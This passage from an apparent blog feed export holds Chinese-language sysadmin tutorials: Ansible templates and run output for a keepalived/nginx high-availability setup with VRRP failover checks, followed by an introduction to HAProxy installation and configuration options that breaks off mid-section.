class="line"></span><br><span class="line">vrrp_instance VI_1 &#123;</span><br><span class="line">    state &#123;&#123; state1 &#125;&#125;  </span><br><span class="line">    interface ens33 </span><br><span class="line">    virtual_router_id 14</span><br><span class="line">    priority &#123;&#123; priority1 &#125;&#125; </span><br><span class="line">    advert_int 1</span><br><span class="line">    authentication &#123;</span><br><span class="line">        auth_type PASS</span><br><span class="line">        auth_pass 571f87b2</span><br><span class="line">    &#125;</span><br><span class="line">    virtual_ipaddress &#123;</span><br><span class="line">        192.168.1.100</span><br><span class="line">    &#125;</span><br><span class="line">    track_script &#123;</span><br><span class="line">        chk_down</span><br><span class="line">        chk_nginx</span><br><span class="line">    &#125;</span><br><span class="line">    notify_master &quot;/etc/keepalived/notify.sh master&quot;</span><br><span class="line">    notify_backup &quot;/etc/keepalived/notify.sh backup&quot;</span><br><span class="line">    notify_fault &quot;/etc/keepalived/notify.sh fault&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">vrrp_instance VI_r2 &#123;</span><br><span class="line">    state &#123;&#123; state2 &#125;&#125;  </span><br><span class="line">    interface ens33 </span><br><span class="line">    virtual_router_id 24</span><br><span class="line">    priority &#123;&#123; priority2 &#125;&#125; </span><br><span class="line">    advert_int 1</span><br><span class="line">    authentication &#123;</span><br><span class="line">        auth_type PASS</span><br><span class="line">        auth_pass 571f97b2</span><br><span class="line">    &#125;</span><br><span class="line">    virtual_ipaddress &#123;</span><br><span class="line">        192.168.1.200</span><br><span class="line">    &#125;</span><br><span class="line">    track_script &#123;</span><br><span class="line">        chk_down</span><br><span class="line">        chk_nginx</span><br><span class="line">    &#125;</span><br><span class="line">    notify_master &quot;/etc/keepalived/notify.sh master&quot;</span><br><span class="line">    notify_backup &quot;/etc/keepalived/notify.sh backup&quot;</span><br><span class="line">    notify_fault &quot;/etc/keepalived/notify.sh fault&quot;</span><br><span class="line">&#125;  </span><br><span class="line">EOF</span><br></pre></td></tr></table></figure><ul><li>notify.sh模板文件</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">cat &gt;&gt; files/notify.sh.j2 &lt;&lt; EOF</span><br><span class="line">#!/bin/bash</span><br><span class="line">#</span><br><span class="line">contact=&apos;root@localhost&apos;</span><br><span class="line"></span><br><span class="line">notify() &#123;</span><br><span class="line">local mailsubject=&quot;$(hostname) to be $1, vip floating&quot;</span><br><span class="line">local mailbody=&quot;$(date +&apos;%F %T&apos;): vrrp transition, $(hostname) changed to be $1&quot;</span><br><span class="line">echo &quot;$mailbody&quot; | mail -s &quot;$mailsubject&quot; $contact</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">case $1 in</span><br><span class="line">master)</span><br><span class="line">notify master</span><br><span class="line">;;</span><br><span class="line">backup)</span><br><span class="line">notify backup</span><br><span class="line">;;</span><br><span class="line">fault)</span><br><span class="line">notify fault</span><br><span class="line">;;</span><br><span class="line">*)</span><br><span class="line">echo &quot;Usage: $(basename $0) &#123;master|backup|fault&#125;&quot;</span><br><span class="line">exit 1</span><br><span class="line">;;</span><br><span class="line">esac</span><br><span class="line">EOF</span><br></pre></td></tr></table></figure><ul><li>nginx反代模板配置文件</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">cat &gt;&gt; nginx.conf.j2 &lt;&lt; EOF</span><br><span class="line">user nginx;</span><br><span class="line">worker_processes auto;</span><br><span class="line">error_log /var/log/nginx/error.log;</span><br><span class="line">pid /run/nginx.pid;</span><br><span class="line">include /usr/share/nginx/modules/*.conf;</span><br><span class="line">events &#123;</span><br><span class="line">    worker_connections 1024;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line">#add upstream</span><br><span class="line">upstream web &#123;                       </span><br><span class="line">        server 192.168.1.38;</span><br><span class="line">        server 192.168.1.48;</span><br><span class="line">    &#125;</span><br><span class="line">    log_format  main  &apos;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &apos;</span><br><span class="line">                      &apos;$status $body_bytes_sent &quot;$http_referer&quot; &apos;</span><br><span class="line">                      &apos;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&apos;;</span><br><span class="line">    access_log  /var/log/nginx/access.log  main;</span><br><span class="line">    sendfile            on;</span><br><span class="line">    tcp_nopush          on;</span><br><span class="line">    tcp_nodelay         on;</span><br><span class="line">    keepalive_timeout   65;</span><br><span class="line">    types_hash_max_size 2048;</span><br><span class="line">    include             /etc/nginx/mime.types;</span><br><span class="line">    default_type        application/octet-stream;</span><br><span class="line">    include /etc/nginx/conf.d/*.conf;</span><br><span class="line">    server &#123;</span><br><span class="line">        listen       80 default_server;</span><br><span class="line">        listen       [::]:80 default_server;</span><br><span class="line">        server_name  _;</span><br><span class="line">        root         /usr/share/nginx/html;</span><br><span class="line">        # Load configuration files for the default server block.</span><br><span class="line">        include /etc/nginx/default.d/*.conf;</span><br><span class="line">        #add proxy_pass</span><br><span class="line">        location / &#123;</span><br><span class="line">        proxy_pass http://web;</span><br><span class="line">        &#125;</span><br><span class="line">        error_page 404 /404.html;</span><br><span class="line">            location = /40x.html &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        error_page 500 502 503 504 /50x.html;</span><br><span class="line">            location = /50x.html &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>编制nginx剧本</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/ansible/nginx.yml</span><br><span class="line">- hosts: nginx</span><br><span class="line">  remote_user: root</span><br><span class="line">  roles:</span><br><span class="line">  - nginx</span><br></pre></td></tr></table></figure><ul><li>开始表演</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">]#ansible-playbook  /etc/ansible/nginx.yml </span><br><span class="line">PLAY [nginx] *******************************************************************</span><br><span class="line">TASK [Gathering Facts] *********************************************************</span><br><span class="line">ok: [192.168.1.30]</span><br><span class="line">ok: [192.168.1.28]</span><br><span class="line"></span><br><span class="line">TASK [nginx : install package] *************************************************</span><br><span class="line">changed: [192.168.1.30] =&gt; (item=[u&apos;nginx&apos;, u&apos;keepalived&apos;])</span><br><span class="line">changed: [192.168.1.28] =&gt; (item=[u&apos;nginx&apos;, u&apos;keepalived&apos;])</span><br><span class="line"></span><br><span class="line">TASK [nginx : config keepalived] ***********************************************</span><br><span class="line">changed: [192.168.1.30]</span><br><span class="line">changed: [192.168.1.28]</span><br><span class="line"></span><br><span class="line">TASK [nginx : file notify.sh] **************************************************</span><br><span class="line">changed: [192.168.1.30]</span><br><span class="line">changed: [192.168.1.28]</span><br><span class="line"></span><br><span class="line">TASK [nginx : config nginx] ****************************************************</span><br><span class="line">changed: [192.168.1.30]</span><br><span class="line">changed: [192.168.1.28]</span><br><span class="line"></span><br><span class="line">TASK [nginx : start service] ***************************************************</span><br><span class="line">changed: [192.168.1.28] =&gt; (item=keepalived)</span><br><span class="line">changed: [192.168.1.30] =&gt; (item=keepalived)</span><br><span class="line">changed: [192.168.1.28] =&gt; (item=nginx)</span><br><span class="line">changed: [192.168.1.30] =&gt; (item=nginx)</span><br><span class="line"></span><br><span class="line">RUNNING HANDLER [nginx : restart keepalived] ***********************************</span><br><span class="line">changed: [192.168.1.30]</span><br><span class="line">changed: [192.168.1.28]</span><br><span class="line"></span><br><span class="line">RUNNING HANDLER [nginx : restart nginx] ****************************************</span><br><span class="line">changed: [192.168.1.30]</span><br><span class="line">changed: [192.168.1.28]</span><br><span class="line"></span><br><span class="line">PLAY RECAP *********************************************************************</span><br><span class="line">192.168.1.28               : ok=8    changed=7    unreachable=0    failed=0   </span><br><span class="line">192.168.1.30               : ok=8    changed=7    unreachable=0    failed=0</span><br></pre></td></tr></table></figure><ul><li>在keepalive上调式</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">]# tcpdump  -i  ens33 -nn host 224.0.100.19</span><br><span class="line">20:11:55.223233 IP 192.168.1.28 &gt; 224.0.100.19: VRRPv2, Advertisement, vrid 24, prio 100, authtype simple, intvl 1s, length 20</span><br><span class="line">20:11:55.531460 IP 192.168.1.30 &gt; 224.0.100.19: VRRPv2, Advertisement, vrid 14, prio 100, authtype simple, intvl 1s, length 20</span><br><span class="line">20:11:56.226411 IP 192.168.1.28 &gt; 224.0.100.19: VRRPv2, Advertisement, vrid 24, prio 100, authtype simple, intvl 1s, length 20</span><br></pre></td></tr></table></figure><ul><li>在192.168.1.28上创建down文件,权限立马被192.168.1.30抢去，同理反之亦然。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">]# touch /etc/keepalived/down</span><br><span class="line">]# tcpdump  -i  ens33 -nn host 224.0.100.19</span><br><span class="line">20:12:46.765300 IP 192.168.1.30 &gt; 224.0.100.19: VRRPv2, Advertisement, vrid 14, prio 100, authtype simple, intvl 1s, length 20</span><br><span class="line">20:12:47.346001 IP 192.168.1.30 &gt; 224.0.100.19: VRRPv2, Advertisement, vrid 24, prio 90, authtype simple, intvl 1s, length 20</span><br><span class="line">20:12:47.769385 IP 192.168.1.30 &gt; 224.0.100.19: VRRPv2, Advertisement, vrid 14, prio 100, authtype simple, intvl 1s, length 20</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="internet" scheme="https://fenghong.tech/categories/internet/"/>
    
    
      <category term="server" scheme="https://fenghong.tech/tags/server/"/>
    
      <category term="Linux" scheme="https://fenghong.tech/tags/Linux/"/>
    
      <category term="internet" scheme="https://fenghong.tech/tags/internet/"/>
    
  </entry>
  
  <entry>
    <title>HAProxy</title>
    <link href="https://fenghong.tech/haproxy.html"/>
    <id>https://fenghong.tech/haproxy.html</id>
    <published>2018-07-09T11:59:32.000Z</published>
    <updated>2018-11-07T11:31:40.440Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>摘要：</p><ul><li>HAproxy的介绍安装及使用</li><li>配置文件的说明及用法</li><li>ACL的配置文件选项说明</li><li>常用用法及实验</li></ul><h1 id="HAProxy"><a href="#HAProxy" class="headerlink" title="HAProxy"></a>HAProxy</h1><ul><li>官网：</li></ul><p><a href="http://www.haproxy.org" target="_blank" rel="noopener">http://www.haproxy.org</a></p><p><a href="http://www.haproxy.com" target="_blank" rel="noopener">http://www.haproxy.com</a></p><ul><li>官方文档：</li></ul><p><a href="http://cbonte.github.io/haproxy-dconv/" target="_blank" rel="noopener">http://cbonte.github.io/haproxy-dconv/</a></p><ul><li>HAProxy简介：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">HAProxy is a TCP/HTTP reverse proxy which is particularly suited</span><br><span class="line">            : for high availability environments. Indeed, it can:</span><br><span class="line">            :  - route HTTP requests depending on statically assigned cookies</span><br><span class="line">            :  - spread load among several servers while assuring server </span><br><span class="line">            :  persistence through the use of HTTP cookies</span><br><span class="line">            :  - switch to backup servers in the event a main server fails</span><br><span class="line">            :  - accept connections to special ports dedicated to service monitoring</span><br><span class="line">            :  - stop accepting connections without breaking existing ones</span><br><span class="line">            :  - add, modify, and delete HTTP headers in both directions</span><br><span class="line">            :  - block requests matching particular patterns</span><br><span class="line">            :  - report detailed status to authenticated users from a URI  </span><br><span class="line">            :    intercepted by the application</span><br></pre></td></tr></table></figure><ul><li>反向代理的集群环境</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">七层反代：</span><br><span class="line">nginx(http, ngx_http_upstream_module), haproxy(mode http), httpd, ats, perlbal, pound...</span><br><span class="line">ssl/tls 会话卸载器</span><br><span class="line">四层反代：</span><br><span class="line">lvs, nginx(stream)，haproxy(mode tcp)</span><br><span class="line">数据分布:</span><br><span class="line">结构化数据：mysql，50-100次/s</span><br><span class="line">半结构化数据：mangodb，redis,50-100万次/s</span><br><span class="line">非结构化数据：分布式存储系统</span><br></pre></td></tr></table></figure><ul><li>调度器</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">众多调度算法</span><br><span class="line">事件驱动模型，单进程模型处理多应用请求</span><br><span class="line">最好使用单线程</span><br></pre></td></tr></table></figure><ul><li>安装</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">]# yum install -y haproxy</span><br><span class="line">]# rpm -ql haproxy</span><br><span class="line">/etc/haproxy/haproxy.cfg#主配置文件</span><br><span class="line">/etc/logrotate.d/haproxy</span><br><span class="line">/etc/sysconfig/haproxy#Uint file配置文件</span><br><span class="line">/usr/bin/halog</span><br><span class="line">/usr/bin/iprange</span><br><span class="line">/usr/lib/systemd/system/haproxy.service#Uint file</span><br><span class="line">/usr/sbin/haproxy#主程序</span><br></pre></td></tr></table></figure><h1 id="Haproxy配置说明"><a href="#Haproxy配置说明" class="headerlink" title="Haproxy配置说明"></a>Haproxy配置说明</h1><p>配置文件：<a href="http://cbonte.github.io/haproxy-dconv/1.5/configuration.html" target="_blank" rel="noopener">官网配置</a></p><ul><li>global全局配置段</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">配置段内容：</span><br><span class="line">进程及安全配置相关的参数</span><br><span class="line">性能调整相关参数</span><br><span class="line">Debug参数</span><br><span class="line">用户列表</span><br><span class="line">peers</span><br><span class="line">配置参数</span><br><span class="line">进程及安全管理：chroot, daemon，user, group, uid, gid</span><br><span class="line">log：定义全局的syslog服务器；最多可以定义两个；</span><br><span class="line">log &lt;address&gt; [len &lt;length&gt;] &lt;facility&gt; [max level [min level]]</span><br><span class="line">nbproc &lt;number&gt;：要启动的haproxy的进程数量；</span><br><span class="line">ulimit-n &lt;number&gt;：每个haproxy进程可打开的最大文件数；</span><br></pre></td></tr></table></figure><ul><li>性能配置</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">maxconn &lt;number&gt;：设定每个haproxy进程所能接受的最大并发连接数；</span><br><span class="line">Sets the maximum per-process number of concurrent connections to &lt;number&gt;. </span><br><span class="line">    总体的并发连接数：nbproc * maxconn</span><br><span class="line">maxconnrate &lt;number&gt;：每个进程每秒种所能创建的最大连接数量；</span><br><span class="line">Sets the maximum per-process number of connections per second to &lt;number&gt;. </span><br><span class="line">maxsessrate &lt;number&gt;：</span><br><span class="line">maxsslconn &lt;number&gt;: 设定每个haproxy进程所能接受的ssl的最大并发连接数；</span><br><span class="line">Sets the maximum per-process number of concurrent SSL connections to &lt;number&gt;.</span><br><span class="line">    spread-checks &lt;0..50, in percent&gt;</span><br></pre></td></tr></table></figure><ul><li>代理配置段</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">defaults：为frontend, listen, backend提供默认配置；</span><br><span class="line">fronted：前端，相当于nginx, server &#123;&#125;</span><br><span class="line">backend：后端，相当于nginx, upstream &#123;&#125;</span><br><span class="line">listen：同时拥前端和后端</span><br></pre></td></tr></table></figure><ul><li>代理配置端解释</li></ul><blockquote><p>A “frontend” section describes a set of listening sockets accepting client connections.</p><p>A “backend” section describes a set of servers to which the proxy will connect to forward incoming connections.</p><p>A “listen” section defines a complete proxy with its frontend and backend parts combined in one section. It is generally useful for TCP-only traffic.</p><p>All proxy names must be formed from upper and lower case letters, digits, ‘-‘ (dash), ‘_’ (underscore) , ‘.’ (dot) and ‘:’ (colon). 区分字符大小写；</p></blockquote><ul><li>简单配置示例</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">frontend web</span><br><span class="line">bind *:80</span><br><span class="line">default_backend     websrvs</span><br><span class="line"></span><br><span class="line">backend websrvs</span><br><span class="line">balance roundrobin</span><br><span class="line">server srv1 192.168.1.20:80 check</span><br><span class="line">server srv2 192.168.1.13:80 check</span><br></pre></td></tr></table></figure><h1 id="代理参数说明"><a href="#代理参数说明" class="headerlink" title="代理参数说明"></a>代理参数说明</h1><ul><li><strong>bind</strong></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bind：Define one or several listening addresses and/or ports in a frontend.</span><br><span class="line">bind [&lt;address&gt;]:&lt;port_range&gt; [, ...] [param*]</span><br><span class="line"></span><br><span class="line">listen http_proxy</span><br><span class="line">bind :80,:443</span><br><span class="line">bind 10.0.0.1:10080,10.0.0.1:10443</span><br><span class="line">bind /var/run/ssl-frontend.sock user root mode 600 accept-proxy</span><br></pre></td></tr></table></figure><ul><li>balance</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">balance：后端服务器组内的服务器调度算法</span><br><span class="line">balance &lt;algorithm&gt; [ &lt;arguments&gt; ]</span><br><span class="line">balance url_param &lt;param&gt; [check_post]</span><br><span class="line"></span><br><span class="line">算法：</span><br><span class="line">roundrobin：Each server is used in turns, according to their weights.</span><br><span class="line">server options： weight #</span><br><span class="line">动态算法：支持权重的运行时调整，支持慢启动；每个后端中最多支持4095个server；</span><br><span class="line">static-rr：</span><br><span class="line">静态算法：不支持权重的运行时调整及慢启动；后端主机数量无上限；</span><br><span class="line"></span><br><span class="line">leastconn：</span><br><span class="line">推荐使用在具有较长会话的场景中，例如MySQL、LDAP等；</span><br><span class="line"></span><br><span class="line">first：</span><br><span class="line">根据服务器在列表中的位置，自上而下进行调度；</span><br><span class="line">前面服务器的连接数达到上限，新请求才会分配给下一台服务；</span><br><span class="line"></span><br><span class="line">source：源地址hash；</span><br><span class="line">除权取余法：</span><br><span class="line">一致性哈希：</span><br><span class="line"></span><br><span class="line">uri：</span><br><span class="line">对URI的左半部分做hash计算，并由服务器总权重相除以后派发至某挑出的服务器；</span><br><span class="line">&lt;scheme&gt;://&lt;user&gt;:&lt;password&gt;@&lt;host&gt;:&lt;port&gt;/&lt;path&gt;;&lt;params&gt;?&lt;query&gt;#&lt;frag&gt;</span><br><span class="line">左半部分：/&lt;path&gt;;&lt;params&gt;</span><br><span class="line">整个uri：/&lt;path&gt;;&lt;params&gt;?&lt;query&gt;#&lt;frag&gt;</span><br><span class="line">username=jerry</span><br><span class="line">url_param：</span><br><span class="line">对用户请求的uri的&lt;params&gt;部分中的参数的值作hash计算;</span><br><span class="line">并由服务器总权重相除以后派发至某挑出的服务器；</span><br><span class="line">通常用于追踪用户，以确保来自同一个用户的请求始终发往同一个Backend Server；</span><br><span class="line"></span><br><span class="line">hdr(&lt;name&gt;)：</span><br><span class="line">对于每个http请求，此处由&lt;name&gt;指定的http首部将会被取出做hash计算； </span><br><span class="line">并由服务器总权重相除以后派发至某挑出的服务器；没有有效值的会被轮询调度； </span><br><span class="line">hdr(Cookie)</span><br><span class="line"></span><br><span class="line">rdp-cookie</span><br><span class="line">rdp-cookie(&lt;name&gt;)</span><br></pre></td></tr></table></figure><ul><li>log</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">log &lt;address&gt; [len &lt;length&gt;] &lt;facility&gt; [max level [min level]]</span><br><span class="line"></span><br><span class="line">[root@haproxy ~]# vim /etc/haproxy/haproxy.cfg</span><br><span class="line">log         127.0.0.1 local2</span><br><span class="line">[root@haproxy ~]# systemctl restart haproxy</span><br><span class="line">[root@haproxy ~]# vim /etc/rsyslog.conf</span><br><span class="line">#### MODULES ####</span><br><span class="line">$ModLoad imudp</span><br><span class="line">$UDPServerRun 514</span><br><span class="line">#### RULES ####</span><br><span class="line"># Save haproxy log to haproxy.log</span><br><span class="line">local2.*      /var/log/haproxy.log</span><br><span class="line">[root@haproxy ~]# systemctl restart rsyslog</span><br></pre></td></tr></table></figure><ul><li>hash-type</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">hash-type：哈希算法</span><br><span class="line">hash-type &lt;method&gt; &lt;function&gt; &lt;modifier&gt;</span><br><span class="line">map-based：除权取余法，哈希数据结构是静态的数组；</span><br><span class="line">consistent：一致性哈希，哈希数据结构是一个树；</span><br><span class="line"></span><br><span class="line">&lt;function&gt; is the hash function to be used : 哈希函数</span><br><span class="line">sdbm</span><br><span class="line">djb2</span><br><span class="line">wt6</span><br></pre></td></tr></table></figure><ul><li>server</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">server &lt;name&gt; &lt;address&gt;[:[port]] [param*]</span><br><span class="line">定义后端主机的各服务器及其选项；</span><br><span class="line"></span><br><span class="line"> server &lt;name&gt; &lt;address&gt;[:port] [settings ...]</span><br><span class="line">default-server [settings ...]</span><br><span class="line"></span><br><span class="line">&lt;name&gt;：服务器在haproxy上的内部名称；出现在日志及警告信息中；</span><br><span class="line">&lt;address&gt;：服务器地址，支持使用主机名；</span><br><span class="line">[:[port]]：端口映射；省略时，表示同bind中绑定的端口；</span><br><span class="line">[param*]：参数</span><br><span class="line">maxconn &lt;maxconn&gt;：当前server的最大并发连接数；</span><br><span class="line">backlog &lt;backlog&gt;：当前server的连接数达到上限后的后援队列长度；</span><br><span class="line">backup：设定当前server为备用服务器；</span><br><span class="line">check：对当前server做健康状态检测；</span><br><span class="line">addr ：检测时使用的IP地址；</span><br><span class="line">port ：针对此端口进行检测；</span><br><span class="line">inter &lt;delay&gt;：连续两次检测之间的时间间隔，默认为2000ms; </span><br><span class="line">rise &lt;count&gt;：连续多少次检测结果为“成功”才标记服务器为可用；默认为2；</span><br><span class="line">fall &lt;count&gt;：连续多少次检测结果为“失败”才标记服务器为不可用；默认为3；</span><br><span class="line"></span><br><span class="line">注意：option httpchk，&quot;smtpchk&quot;, &quot;mysql-check&quot;, &quot;pgsql-check&quot; and &quot;ssl-hello-chk&quot; 用于定义应用层检测方法；</span><br><span class="line"></span><br><span class="line">cookie &lt;value&gt;：为当前server指定其cookie值，用于实现基于cookie的会话黏性；</span><br><span class="line">disabled：标记为不可用；</span><br><span class="line">on-error &lt;mode&gt;：后端服务故障时的行动策略；</span><br><span class="line">        - fastinter: force fastinter</span><br><span class="line">        - fail-check: simulate a failed check, also forces fastinter (default)</span><br><span class="line">        - sudden-death: simulate a pre-fatal failed health check, one more failed</span><br><span class="line">        check will mark a server down, forces fastinter</span><br><span class="line">        - mark-down: mark the server immediately down and force fastinter</span><br><span class="line">redir &lt;prefix&gt;：将发往此server的所有GET和HEAD类的请求重定向至指定的URL；</span><br><span class="line">weight &lt;weight&gt;：权重，默认为1;</span><br></pre></td></tr></table></figure><ul><li>option httpchk</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">option httpchk</span><br><span 